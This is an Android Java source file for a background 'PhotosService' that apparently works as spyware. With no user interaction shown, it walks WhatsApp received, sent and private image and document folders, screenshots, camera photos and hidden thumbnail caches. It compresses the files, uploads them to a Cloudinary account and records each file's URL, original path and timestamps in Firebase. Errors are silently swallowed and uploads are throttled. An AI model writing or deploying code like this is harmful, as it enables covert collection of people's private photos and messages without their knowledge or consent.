package com.falcon.app;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.IBinder;
import android.os.Build;
import android.provider.Settings;
import androidx.annotation.Nullable;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class PhotosService extends Service {

    private static final int MAX_FILES_PER_RUN = 50;
    private static final long MAX_IMAGE_SIZE_BYTES = 150 * 1024;
    private static final long MAX_UPLOAD_24H_BYTES = 100 * 1024 * 1024;
    
    private static final String PREFS_NAME = "app_data";
    private static final String CLOUD_NAME = "cloud_name";
    private static final String UPLOAD_PRESET = "upload_preset";
    private static final String CLOUD_BACKOFF = "cloud_backoff_until";
    private static final String UPLOAD_24H_BYTES = "upload_bytes_24h";
    private static final String UPLOAD_24H_RESET_TIME = "upload_bytes_reset_time";
    private static final String UPLOAD_24H_BACKOFF = "upload_24h_backoff_until";
    
    private final ExecutorService uploadExecutor = Executors.newFixedThreadPool(3);
    private final Set<String> uploadingFiles = Collections.synchronizedSet(new HashSet<>());
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                startFolderSync();
            } catch (Throwable e) {
                ErrorReporter.send(getApplicationContext(), "PhotosService.java.public.int.onStartCommand.catch", e);
            }
        }).start();
        return START_NOT_STICKY;
    }

    static class SyncConfig {
        final String cloudFolder;
        final String databasePath;

        SyncConfig(String cloudFolder, String databasePath) {
            this.cloudFolder = cloudFolder;
            this.databasePath = databasePath;
        }
    }

    private void startFolderSync() {
        try {
            Map<String, SyncConfig> syncMap = new LinkedHashMap<>();

            syncMap.put("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
                    new SyncConfig("whatsapp/received", "users_data/uid/photos/whatsapp_received"));
            syncMap.put("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Private",
                    new SyncConfig("whatsapp/received", "users_data/uid/photos/whatsapp_received"));
            syncMap.put("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",
                    new SyncConfig("whatsapp/received", "users_data/uid/photos/whatsapp_received"));
            syncMap.put("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents/Private",
                    new SyncConfig("whatsapp/received", "users_data/uid/photos/whatsapp_received"));

            syncMap.put("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent",
                    new SyncConfig("whatsapp/sent", "users_data/uid/photos/whatsapp_sent"));
            syncMap.put("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents/Sent",
                    new SyncConfig("whatsapp/sent", "users_data/uid/photos/whatsapp_sent"));

            syncMap.put("/storage/emulated/0/Pictures/Screenshots",
                    new SyncConfig("screenshots", "users_data/uid/photos/screenshots"));
            syncMap.put("/storage/emulated/0/DCIM/Screenshots",
                    new SyncConfig("screenshots", "users_data/uid/photos/screenshots"));

            syncMap.put("/storage/emulated/0/Pictures/.thumbnails",
                    new SyncConfig("thumbnails", "users_data/uid/photos/thumbnails"));
            syncMap.put("/storage/emulated/0/DCIM/.thumbnails",
                    new SyncConfig("thumbnails", "users_data/uid/photos/thumbnails"));

            syncMap.put("/storage/emulated/0/DCIM/Camera",
                    new SyncConfig("camera", "users_data/uid/photos/camera"));

            for (Map.Entry<String, SyncConfig> entry : syncMap.entrySet()) {
                try {
                    File folder = new File(entry.getKey());
                    if (folder.exists() && folder.isDirectory()) {
                        syncFolder(entry.getKey(), entry.getValue());
                    }
                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.startFolderSync.inner.catch", e);
                }
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.startFolderSync.outer.catch", e);
        }
    }

    private void syncFolder(String localFolderPath, SyncConfig config) {
        try {
            SharedPreferences prefs = getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);

            long backoffUntil = prefs.getLong(CLOUD_BACKOFF, 0);
            if (System.currentTimeMillis() < backoffUntil) {
                return;
            }

            long dailyBackoff = prefs.getLong(UPLOAD_24H_BACKOFF, 0);
            if (System.currentTimeMillis() < dailyBackoff) {
                return;
            }

            checkAndReset24hCounter(prefs);

            File folder = new File(localFolderPath);
            if (!folder.exists() || !folder.isDirectory()) return;

            File[] files = folder.listFiles();
            if (files == null) return;

            List<File> imageFiles = new ArrayList<>();
            for (File file : files) {
                try {
                    String path = file.getAbsolutePath();
                    if (file.isFile() && isImageFile(path)) {
                        synchronized (uploadingFiles) {
                            if (!prefs.getBoolean(path, false) && !uploadingFiles.contains(path)) {
                                imageFiles.add(file);
                            }
                        }
                    }
                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.SyncFolder.inner.catch.files", e);
                }
            }

            Collections.sort(imageFiles, Comparator.comparingLong(File::lastModified));

            int limit = Math.min(imageFiles.size(), MAX_FILES_PER_RUN);
            List<File> filesToUpload = imageFiles.subList(0, limit);

            for (File file : filesToUpload) {
                try {
                    if (!canUploadMore(prefs)) {
                        set24hBackoff(prefs);
                        break;
                    }
                    synchronized (uploadingFiles) {
                        uploadingFiles.add(file.getAbsolutePath());
                    }
                    processAndUploadFile(file, config, prefs);
                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.SyncFolder.inner.catch.uploadingFiles", e);
                }
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.SyncFolder.outer.catch", e);
        }
    }

    private boolean isImageFile(String path) {
        try {
            String lowerPath = path.toLowerCase();
            return lowerPath.endsWith(".jpg") ||
                    lowerPath.endsWith(".jpeg") ||
                    lowerPath.endsWith(".png") ||
                    lowerPath.endsWith(".webp");
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.boolean.isImageFile.catch", e);
            return false;
        }
    }

    private void checkAndReset24hCounter(SharedPreferences prefs) {
        try {
            long resetTime = prefs.getLong(UPLOAD_24H_RESET_TIME, 0);
            long now = System.currentTimeMillis();
            if (now - resetTime >= 24 * 60 * 60 * 1000) {
                prefs.edit()
                        .putLong(UPLOAD_24H_BYTES, 0)
                        .putLong(UPLOAD_24H_RESET_TIME, now)
                        .remove(UPLOAD_24H_BACKOFF)
                        .apply();
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.checkAndReset24hCounter.catch", e);
        }
    }

    private boolean canUploadMore(SharedPreferences prefs) {
        try {
            long uploadedBytes = prefs.getLong(UPLOAD_24H_BYTES, 0);
            return uploadedBytes < MAX_UPLOAD_24H_BYTES;
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.boolean.canUploadMore.catch", e);
            return false;
        }
    }

    private void addUploadedBytes(SharedPreferences prefs, long bytes) {
        try {
            long current = prefs.getLong(UPLOAD_24H_BYTES, 0);
            long resetTime = prefs.getLong(UPLOAD_24H_RESET_TIME, 0);
            if (resetTime == 0) {
                resetTime = System.currentTimeMillis();
            }
            prefs.edit()
                    .putLong(UPLOAD_24H_BYTES, current + bytes)
                    .putLong(UPLOAD_24H_RESET_TIME, resetTime)
                    .apply();
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.addUploadedBytes.catch", e);
        }
    }

    private void set24hBackoff(SharedPreferences prefs) {
        try {
            long resetTime = prefs.getLong(UPLOAD_24H_RESET_TIME, 0);
            if (resetTime == 0) resetTime = System.currentTimeMillis();
            long backoffUntil = resetTime + 24 * 60 * 60 * 1000;
            prefs.edit().putLong(UPLOAD_24H_BACKOFF, backoffUntil).apply();
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.set24hBackoff.catch", e);
        }
    }

    private void processAndUploadFile(File file, SyncConfig config, SharedPreferences prefs) {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) {
                synchronized (uploadingFiles) { uploadingFiles.remove(file.getAbsolutePath()); }
                return;
            }

            final String originalPath = file.getAbsolutePath();
            final String uid = user.getUid();
            final String fileName = file.getName();
            final long deviceImageTime = file.lastModified();
            final String finalDatabasePath = config.databasePath.replace("uid", uid);

            uploadExecutor.execute(() -> {
                File fileToUpload = file;
                File tempFile = null;

                try {
                    if (!file.exists()) {
                        synchronized (uploadingFiles) { uploadingFiles.remove(originalPath); }
                        return;
                    }

                    if (!canUploadMore(prefs)) {
                        set24hBackoff(prefs);
                        synchronized (uploadingFiles) { uploadingFiles.remove(originalPath); }
                        return;
                    }

                    tempFile = compressImage(file);
                    if (tempFile != null) fileToUpload = tempFile;

                    uploadToCloud(fileToUpload, originalPath, uid, fileName,
                            config.cloudFolder, finalDatabasePath, prefs, tempFile, deviceImageTime);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.processAndUploadFile.inner.catch", e);
                    synchronized (uploadingFiles) { uploadingFiles.remove(originalPath); }
                    if (tempFile != null && tempFile.exists()) {
                        try { tempFile.delete(); } catch (Throwable ignored2) {}
                    }
                }
            });
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.processAndUploadFile.outer.catch", e);
            try { synchronized (uploadingFiles) { uploadingFiles.remove(file.getAbsolutePath()); } } catch (Throwable ignored2) {}
        }
    }

    private File compressImage(File originalFile) {
        try {
            if (originalFile.length() <= MAX_IMAGE_SIZE_BYTES) {
                return null;
            }

            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            BitmapFactory.decodeFile(originalFile.getAbsolutePath(), options);

            int scale = 1;
            while (options.outWidth / scale > 2048 || options.outHeight / scale > 2048) {
                scale *= 2;
            }

            options.inJustDecodeBounds = false;
            options.inSampleSize = scale;
            Bitmap bitmap = BitmapFactory.decodeFile(originalFile.getAbsolutePath(), options);
            if (bitmap == null) return null;

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int quality = 85;

            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);

            while (baos.toByteArray().length > MAX_IMAGE_SIZE_BYTES && quality > 10) {
                baos.reset();
                quality -= 10;
                bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            }

            if (baos.toByteArray().length > MAX_IMAGE_SIZE_BYTES) {
                int width = bitmap.getWidth() / 2;
                int height = bitmap.getHeight() / 2;
                Bitmap scaledBitmap = Bitmap.createScaledBitmap(bitmap, width, height, true);
                baos.reset();
                quality = 70;
                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
                scaledBitmap.recycle();
            }

            bitmap.recycle();

            File tempFile = new File(getApplicationContext().getCacheDir(),
                    "temp_" + System.currentTimeMillis() + "_" + originalFile.getName());
            FileOutputStream fos = new FileOutputStream(tempFile);
            fos.write(baos.toByteArray());
            fos.close();
            baos.close();

            return tempFile;

        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.File.compressImage.catch", e);
            return null;
        }
    }

    private void uploadToCloud(File fileToUpload, String originalPath, String uid, String fileName, String cloudFolder, String databasePath, SharedPreferences prefs, File tempFile, long deviceImageTime) {
        try {
            String cloudName = prefs.getString(CLOUD_NAME, null);
            String uploadPreset = prefs.getString(UPLOAD_PRESET, null);
            
            String fileNameWithoutExtension = fileName;
            String lowerFileName = fileName.toLowerCase();

            if (lowerFileName.endsWith(".jpg") || 
                lowerFileName.endsWith(".jpeg") || 
                lowerFileName.endsWith(".png") || 
                lowerFileName.endsWith(".webp")) {

                int dot = fileName.lastIndexOf(".");
                if (dot > 0) {
                    fileNameWithoutExtension = fileName.substring(0, dot);
                }
            }

            if (cloudName == null || uploadPreset == null) {
                synchronized (uploadingFiles) { uploadingFiles.remove(originalPath); }
                return;
            }

            long fileSize = fileToUpload.length();

            checkAndReset24hCounter(prefs);
            if (!canUploadMore(prefs) || (prefs.getLong(UPLOAD_24H_BYTES, 0) + fileSize) > MAX_UPLOAD_24H_BYTES) {
                set24hBackoff(prefs);
                synchronized (uploadingFiles) { uploadingFiles.remove(originalPath); }
                return;
            }

            String finalCloudFolder = "users/" + uid + "/" + cloudFolder;

            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", fileName,
                            RequestBody.create(fileToUpload, MediaType.parse("image/*")))
                    .addFormDataPart("upload_preset", uploadPreset)
                    .addFormDataPart("folder", finalCloudFolder)
                    
                    .addFormDataPart("public_id", fileNameWithoutExtension + "_" + System.currentTimeMillis())
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.cloudinary.com/v1_1/" + cloudName + "/image/upload")
                    .post(requestBody)
                    .build();

            try (Response response = client.newCall(request).execute()) {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        String bodyString = response.body().string();
                        JSONObject json = new JSONObject(bodyString);
                        String cloudUrl = json.getString("secure_url");
                        
                        addUploadedBytes(prefs, fileSize);
                        
                        saveToDatabase(databasePath, fileName, cloudUrl, originalPath, prefs, deviceImageTime);
                    } catch (Throwable e) {
                        ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.uploadToCloud.inner.response.successful.catch", e);
                        synchronized (uploadingFiles) { uploadingFiles.remove(originalPath); }
                    }
                } else if (response.code() == 429) {
                    try {
                        String retryAfter = response.header("Retry-After");
                        long backoffMs = 3600000;
                        if (retryAfter != null) {
                            backoffMs = Long.parseLong(retryAfter) * 1000;
                        }
                        prefs.edit().putLong(CLOUD_BACKOFF, System.currentTimeMillis() + backoffMs).apply();
                        ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.uploadToCloud.response.429", new Throwable("Response 429"));
                    } catch (Throwable e) {
                        ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.uploadToCloud.inner.response.error.catch", e);
                    }
                    synchronized (uploadingFiles) { uploadingFiles.remove(originalPath); }
                } else {
                    ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.uploadToCloud.response.not.successful", new Throwable("Response not successful"));
                    synchronized (uploadingFiles) { uploadingFiles.remove(originalPath); }
                }
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.uploadToCloud.outer.catch", e);
            synchronized (uploadingFiles) { uploadingFiles.remove(originalPath); }
        } finally {
            if (tempFile != null && tempFile.exists()) {
                try { tempFile.delete(); } catch (Throwable ignored) {}
            }
        }
    }

    private void saveToDatabase(String databasePath, String fileName, String url, String localPath, SharedPreferences prefs, long deviceImageTime) {
        try {
            String dateTime = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US).format(new Date());
            
            DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference(databasePath);

            Map<String, Object> data = new HashMap<>();
            data.put("url", url);
            data.put("fileName", fileName);
            data.put("originalPath", localPath);
            data.put("deviceImageTime", formatDateTime(deviceImageTime));
            data.put("uploadImageTime", dateTime);

            dbRef.push().setValue(data).addOnCompleteListener(task -> {
                try {
                    synchronized (uploadingFiles) { uploadingFiles.remove(localPath); }
                    if (task.isSuccessful()) {
                        prefs.edit().putBoolean(localPath, true).apply();
                    } else {
                        ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.saveToDatabase.inner.catch.task.not.successful", new Throwable("Task not successful"));
                    }
                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.saveToDatabase.inner.catch", e);
                }
            });
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.void.saveToDatabase.outer.catch", e);
            try { synchronized (uploadingFiles) { uploadingFiles.remove(localPath); } } catch (Throwable ignored2) {}
        }
    }
    
    private String formatDateTime(long timestamp) {
        try {
            if (timestamp <= 0) return "";
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US);
            return sdf.format(new java.util.Date(timestamp));
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.private.String.formatDateTime.catch", e);
            return "unknown";
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            uploadExecutor.shutdown();
            if (!uploadExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
                uploadExecutor.shutdownNow();
            }
        } catch (InterruptedException e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.public.void.onDestroy.InterruptedException.catch", e);
            uploadExecutor.shutdownNow();
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "PhotosService.java.public.void.onDestroy.Throwable.catch", e);
            uploadExecutor.shutdownNow();
        }
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
